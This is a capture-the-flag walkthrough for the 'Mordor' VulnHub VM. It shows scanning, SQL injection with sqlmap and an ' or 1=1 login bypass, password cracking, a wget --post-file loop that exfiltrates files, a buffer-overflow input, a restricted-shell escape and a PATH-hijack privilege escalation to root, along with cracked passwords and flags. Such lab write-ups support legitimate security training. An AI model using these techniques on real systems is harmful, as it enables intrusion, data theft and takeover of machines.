## Mordor-CTF

    Author: strider  
    Testers: Kyubai  
    Difficulty: Intermediate  
  
Mordor CTF is a CTF-Machine with a nice story.  
  
This VM has a small touch of lord of the rings. And tells a story during part 2 of the movies.

In this VM are 9 flags to get.

This I my first VM i've created, I hope you enjoy it.

The goal is to reach the root and readout the file /root/flag.txt

If you found other ways, to reach the goal, let me know :)

What include this VM?

    Information Gathering
    Enumerarion
    Cracking
    Webexploitation
    Reverse Engineering
    Binary Exploitation
    General Linux skills
    and more...

<a href="https://www.vulnhub.com/entry/mordor-11,361/" target=_>Link VM</a>

## 1. Walkthrough
scan the entire port with nmap & found 3 open port
```bash
$ nmap -p- -sSVC -oN scan.log 10.0.1.9
...snip...
Not shown: 65532 closed ports
PORT     STATE SERVICE         VERSION
22/tcp   open  ssh             OpenSSH 7.9p1 Debian 10 (protocol 2.0)
| ssh-hostkey: 
|   2048 6e:76:ac:41:c6:ce:61:e9:0f:72:9b:eb:63:bd:60:4c (RSA)
|   256 df:63:08:78:1e:75:ee:d6:29:f6:43:42:d9:10:06:fb (ECDSA)
|_  256 19:aa:64:a1:7e:06:e7:21:12:5d:d8:59:f3:0b:17:b0 (ED25519)
80/tcp   open  http            Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Apache2 Debian Default Page: It works
4000/tcp open  remoteanything?
| fingerprint-strings: 
|   NULL: 
|     ___ . . _ 
|     "T$$$P" | |_| |_ 
|     :$$$ | | | |_ 
|     :$$$ "T$$$$$$$b. 
|     :$$$ .g$$$$$p. T$$$$b. T$$$$$bp. BUG "Tb T$b T$P .g$P^^T$$ ,gP^^T$$ 
|     .s^s. :sssp $$$ :$; T$$P $^b. $ dP" `T :$P `T
|     Tbp. 
|_    "T$$p.
```
I don't think port 4000 is necesary, there's nothing in there instead of banner text  
so i enumerate the web on port 80  
finally found `http://10.0.1.9/blackgate/` after brute force dir with rockyou.txt
```
Helms deep is fallen by the Orcs, Frodo is already on thejourney to mordor. You have arrived the black gate of 
mordor. Still unnoticed you observe the situation. After a while you noticed, an another army near the black 
gate. The gate opens and all sentinels and soldiers observe the entire area. flag{bc6fd79cd1fa7ebbcd420cb45434d9a2b4d921a5} 
```

nothing fancy in the source code ...  
then found `http://10.0.1.9/blackgate/admin/` with dirb  
test it with `sqlmap` and indicate param `pwd` is vuln to sqli
```bash
Database: mordor
Table: blackgate
[1 entry]
+---------+----------+------------------------------------------+
| user_id | username | password                                 |
+---------+----------+------------------------------------------+
| 1       | Azog     | 26f736aacd60fb538e72f1307f1e4bb1322b02bc |
+---------+----------+------------------------------------------+
```

try to login with `Azog:' or 1=1 -- #` as user/pass and found a clue in the cookie
```
You+found+a+way+to+bypass+the+black+gate.+A+small+hole+in+the+rocks+gives+you+an+entrance+to+mordor.
+During+the+walk+yo+find+a+piece+of+paper.+On+the+paper+ther+are+a+hint%2C+there+orcs+on+the+other+side.
+The+last+line+looks+like+a+key+%5C%22orc+%2B+flag+%3D+t22.%5C%22
```
decode the clue
```
You found a way to bypass the black gate. A small hole in the rocks gives you an entrance to mordor.
During the walk yo find a piece of paper. On the paper ther are a hint, there orcs on the other side.
The last line looks like a key "orc + flag = t22."
```
i'am stuck from here, but after re-read the clue it's obvious the username is `orc` and the<br>
password is from the last flag. i try to crack it with  wordlist such as `rockyou.txt` <br>
but none of them is correct. then i try to crack the flag with hashcat<br>
```bash
$ hashcat -a 3  -m 100 hash '?l?l?l?l?l?l?l?l' --force
...snip...
bc6fd79cd1fa7ebbcd420cb45434d9a2b4d921a5:disquise
[s]tatus [p]ause [b]ypass [c]heckpoint [q]uit => q
```

access ssh using `orc` as username and `disquise` as password

## 2. Another Puzzle & Escalate to root
user `orc` have rbash as default shell. it restricted all program except program inside ~/bin directory.

exfiltrate file in `~/bin` directory
```bash
orc@mordor:~$ ls bin | while read line; do
> export URL=	
> export LFILE=./bin/$line
> wget --post-file=$LFILE $URL
> done
```

do reversing on extracted file  
file `outpost` is have BoF vulnerability + hardcode flag.
``` bash
orc@mordor:~$ printf '%140s\xef\xbe\xad\xde' | outpost
You arrived the door to escape the outpost.
Many keys are close to you, choose one
key: deadbeef = 0xdeadbeefYou found the key!.
 	flag{8a29aaf5687129c1d27b90578fc33ecc49d069dc}.
 	You gonna try the key on the doorlock!


```

file `door` is have hardcode key + shell function.
```c
...snip...
│           0x00001219      488d35180e00.  lea rsi, str.badpassword    ; 0x2038 ; "badpassword"
...snip...
│       │   0x00001254      488d3d050e00.  lea rdi, str.bin_sh         ; 0x2060 ; "/bin/sh" ; const char *string
│       │   0x0000125b      e8f0fdffff     call sym.imp.system         ; int system(const char *string)
...snip...
```

sha1 for `badpassword` is equal to `8a29aaf5687129c1d27b90578fc33ecc49d069dc`  
testing the backdoor function & bypass restricted shell from rbash.
```bash
You reached the orcs outpost... be quiet
orc@mordor:~$ door 
Enter the right key to unlock the door!
badpassword
You have unlocked the door!
$ /bin/whoami
orc
```
  
found hidden clue in `/whistleblow/Orc.jpg` with exiftool :  
`Psst, little pig, i know what you want! I have hidden information for you`.  
use steghide without password it will extract `whistleblow.txt` file.
```
You want to invade the fortress barad dur. You will got huge trouble, if youre 
noticed by some of the guards. You didn't hear this from me, but there's an 
unguarded entrance to the fortress. The way to that entrace is very dangerous, 
you have to evade the nazguls, they observe every time the area. The big eye is 
watching all time. If you reach the fortess, you have to go behind the fortress 
on the rocks. Go on, before i change my mind.

flag{9e49cb5caf91603db26adb774c6af72c88a6304a}
```
crack the hash with john, found `23lorlorck`  
login with user nazgul but can't access the shell, execute shell command with ssh.  
i try to read the `.bashrc` but there's nothing wrong  
```bash
$ sshpass -p 23lorlorck ssh 10.0.1.9 -l nazgul cat .bashrc
...snip...
echo "" > .bash_history
echo SElJSEhISEhISEhISEhISEhISCEhISEhISEhISEhISwgdGhlIHNjcmVhbSBvZiB0aGUgbmF6Z3VsJ3MuIFRoZXkgd2F0Y2hpbmcgYWxsLCB0aGV5IG93bmVkIGJ5IFNhdXJvbi4uLgpUaGV5IHdhcyBodW1hbnMsIGJlZm9yZSB0aGV5IGZhbGwgdGhyb3VnaCB0aGUgcmluZyBpbnRvIHRoZSBkYXJrbmVzcy4gSWYgdGhleSBzZWUgb25lLCB0aGV5IGtpbGwgaGltIQpCYXJhZCBkdXIgaXMgbmVhci4uLgoK | base64 -d
```
decode the base64 message
```
HIIHHHHHHHHHHHHHHHH!!!!!!!!!!!!, the scream of the nazgul's. They watching all, they owned by Sauron...
They was humans, before they fall through the ring into the darkness. If they see one, they kill him!
Barad dur is near...
```

after searching and recon, i can assume that user root will kill all process belong to nazgul user  
with this python script on `/opt/nazgul/nazguls.py`  
find all file belong to nazgul :  
```
$ find / -user nazgul -print 2>/dev/null
/home/nazgul
/var/www/html/blackgate/admin/index.php
/var/www/html/blackgate/index.php
/var/www/html/blackgate/Black_gate.png
/var/www/html/blackgate/style.css
/minasmorgul
$ sshpass -p 23lorlorck ssh 10.0.1.9 -l nazgul "ls -la /minasmorgul/"
insgesamt 12
drwx------  2 nazgul nazgul 4096 Aug 13  2019 .
drwxr-xr-x 20 root   root   4096 Aug 13  2019 ..
-rwx------  1 nazgul nazgul 1255 Aug 13  2019 flag.txt

$ sshpass -p 23lorlorck ssh 10.0.1.9 -l nazgul "cat /minasmorgul/flag.txt"   
The nazgul's doesnt noticed you, youre very near to the fortress barad dur.
Frodo is already on the journey to morder, for destroying the ring at mount doom.
You see the great glowing eye... darkness overwhelms all you can see...
Mount doom bubbles and smokes very strongly, lightning and thunder rule over the country. Darkness everywhere

               Three::rings
          for:::the::Elven-Kings
       under:the:sky,:Seven:for:the
     Dwarf-Lords::in::their::halls:of
    stone,:Nine             for:Mortal
   :::Men:::     ________     doomed::to
 die.:One   _,-'...:... `-.    for:::the
 ::Dark::  ,- .:::::::::::. `.   Lord::on
his:dark ,'  .:::::zzz:::::.  `.  :throne:
In:::the/    ::::dMMMMMb::::    \ Land::of
:Mordor:\    ::::dMMmgJP::::    / :where::
::the::: '.  '::::YMMMP::::'  ,'  Shadows:
 lie.::One  `. ``:::::::::'' ,'    Ring::to
 ::rule::    `-._```:'''_,-'     ::them::
 all,::One      `-----'        ring::to
   ::find:::                  them,:One
    Ring:::::to            bring::them
      all::and::in:the:darkness:bind
        them:In:the:Land:of:Mordor
           where:::the::Shadows
                :::lie.:::

flag{37643e626fb594b41cf5c86683523cbb2fdb0ddc}

Now you have to find out how invade the fortress barad dur

```

crack the hash with john, found `baraddur`  
login and get another flag :
`flag{636e566640f0930b4772ff76932dd4b83d8987af}`  
answer the question, get a few flags, then get the shell:
```c
...snip...
You defeated Sauron
flag{63905253a3f7cde76ef8ab3adcae7d278b4f5251}
Sauron appears behind you...
...snip...
You defeated Sauron
flag{dca13eaacea2f4d8c28b00558a93be0c2622bbe1}
Sauron appears in front of you...
...snip...
You defeated Sauron
flag{79bed0c263a21843c53ff3c8d407462b7f4b8a4a}
Sauron appears with the whole darkness...
...snip...
You defeated Sauron
He disappears... You defeated him. Now grap the plans!
barad_dur@mordor:~$ whoami
barad_dur
```

There's a suid binary, looks like this is the end of journey :p  
download the binary and do reverse on it.
```c
│           0x00001177      488d3d860e00.  lea rdi, str.ls__root       ; 0x2004 ; "ls /root" ; const char *string
│           0x0000117e      b800000000     mov eax, 0
│           0x00001183      e8a8feffff     call sym.imp.system         ; int system(const char *string)
```

yup, the vulnerable is simple ...  
create program to spawn shell & trick the PATH environment  
```bash
barad_dur@mordor:~$ cat ls.c
main(){setuid(0);setgid(0);system("/bin/sh");}
barad_dur@mordor:~$ gcc ls.c -o ls &>/dev/null
barad_dur@mordor:~$ PATH=.:$PATH ./plans
# whoami
root
# cat /root/flag.txt
                                             _______________________
   _______________________-------------------                       `\
 /:--__                                                              |
||< > |                                   ___________________________/
| \__/_________________-------------------                         |
|                                                                  |
 |                       Congratulations                           |
 |                                                                  |
 |      You have successfully reach the root, i hope                |
  |        you enjoyed the ctf and the story.                       |
  |                                                                  |
  |           flag{262efbb6087a6aae46f029a2ff19f9f409c9cd3d}         |
  |                                                                   |
   |       Created by strider, CC v3                                  |
   |                                                                  |
   |                                                                 |
  |                                              ____________________|_
  |  ___________________-------------------------                      `\
  |/`--_                                                                 |
  ||[ ]||                                            ___________________/
   \===/___________________--------------------------
# 

```

Successfully gather the 9 flags, it means **game over** :3
